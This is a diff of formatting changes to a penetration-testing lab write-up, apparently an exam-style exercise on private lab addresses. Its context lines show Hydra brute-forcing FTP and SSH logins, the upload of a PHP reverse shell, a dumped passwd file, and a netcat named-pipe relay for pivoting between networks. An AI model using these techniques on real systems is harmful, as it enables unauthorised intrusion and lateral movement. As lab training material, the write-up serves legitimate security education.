@@ -78,13 +78,12 @@ Dirs found with a 403 response:
 
 --------------------------------
 --------------------------------
-
 ```
 {% endtab %}
 {% endtabs %}
 
 {% hint style="warning" %}
-**Found relevant information at view-source:**[**http://172.16.37.220/**](http://172.16.37.220)****
+**Found relevant information at view-source:**[**http://172.16.37.220/**](http://172.16.37.220)\*\*\*\*
 
 This discovers a new IP in a new network: **172.16.50.222**
 
@@ -158,7 +157,6 @@ Dirs found with a 403 response:
 
 --------------------------------
 --------------------------------
-
 ```
 {% endtab %}
 {% endtabs %}
@@ -195,7 +193,6 @@ lo        Link encap:Local Loopback
           TX packets:194609 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:16100124 (16.1 MB)  TX bytes:16100124 (16.1 MB)
-
 ```
 {% endhint %}
 
@@ -234,7 +231,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-18 14:34:
 [STATUS] 1870.38 tries/min, 147760 tries in 01:19h, 272367 to do in 02:26h, 30 active
 [STATUS] 1921.68 tries/min, 182560 tries in 01:35h, 237567 to do in 02:04h, 30 active
 [40121][ftp] host: 172.16.37.234   login: ftpuser   password: ftpuser
-
 ```
 {% endtab %}
 {% endtabs %}
@@ -242,7 +238,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-18 14:34:
 {% hint style="warning" %}
 **Found credentials for ftp server through hydra: ftpuser/ftpuser**
 
-Now that we have access to the ftp, **we can upload a PHP reverse shell**, and invoke it by opening this URL in your browser: [**http://172.16.37.234:40180/xyz/rev-shell.php**](http://172.16.37.234:40180/xyz/rev-shell.php)****
+Now that we have access to the ftp, **we can upload a PHP reverse shell**, and invoke it by opening this URL in your browser: [**http://172.16.37.234:40180/xyz/rev-shell.php**](http://172.16.37.234:40180/xyz/rev-shell.php)\*\*\*\*
 {% endhint %}
 
 {% tabs %}
@@ -443,7 +439,6 @@ function printit ($string) {
 }
 
 ?> 
-
 ```
 {% endtab %}
 
@@ -491,7 +486,6 @@ speech-dispatcher:x:120:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/
 elsuser:x:1000:1000:elsuser,,,:/home/elsuser:/bin/bash
 ftpuser:x:0:0::/home/ftpuser:/bin/bash
 test:x:1001:1002::/home/test:
-
 ```
 {% endtab %}
 {% endtabs %}
@@ -532,7 +526,7 @@ nmap 172.16.50.222 -sV -n -v -Pn -p- -T4 -oX portScan.xml
 {% endtab %}
 
 {% tab title="Output" %}
-## Scanner
+### Scanner
 
 > Generated on **Sun Jul 18 21:04:56 2021** with `nmap 7.01`.
 
@@ -540,15 +534,15 @@ nmap 172.16.50.222 -sV -n -v -Pn -p- -T4 -oX portScan.xml
 nmap -sV -n -v -Pn -p- -T4 -oX portScan.xml --min-rate=5000 172.16.50.222
 ```
 
-## Hosts Alive (1)
+### Hosts Alive (1)
 
 | Host          | OS | Accuracy |
 | ------------- | -- | -------- |
 | 172.16.50.222 |    | %        |
 
-## Open Ports and Running Services
+### Open Ports and Running Services
 
-### 172.16.50.222 ( - %)
+#### 172.16.50.222 ( - %)
 
 | Port     | State | Service    | Version                         |
 | -------- | ----- | ---------- | ------------------------------- |
@@ -570,7 +564,6 @@ cd /tmp; mknod backpipex p
 while true; do
     nc -lvp 111 0<backpipex | nc -lvp 222 | tee backpipex
 done;
-
 ```
 {% endtab %}
 
@@ -602,7 +595,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-18 18:24:
 [DATA] attacking ssh://127.0.0.1:222/
 [222][ssh] host: 127.0.0.1   login: root   password: root
 1 of 1 target successfully completed, 1 valid password found
-
 ```
 {% endtab %}
 {% endtabs %}
@@ -638,4 +630,3 @@ Congratz! You got it.
 ## References
 
 {% embed url="https://security.stackexchange.com/questions/188921/use-netcat-to-pivot" %}
-
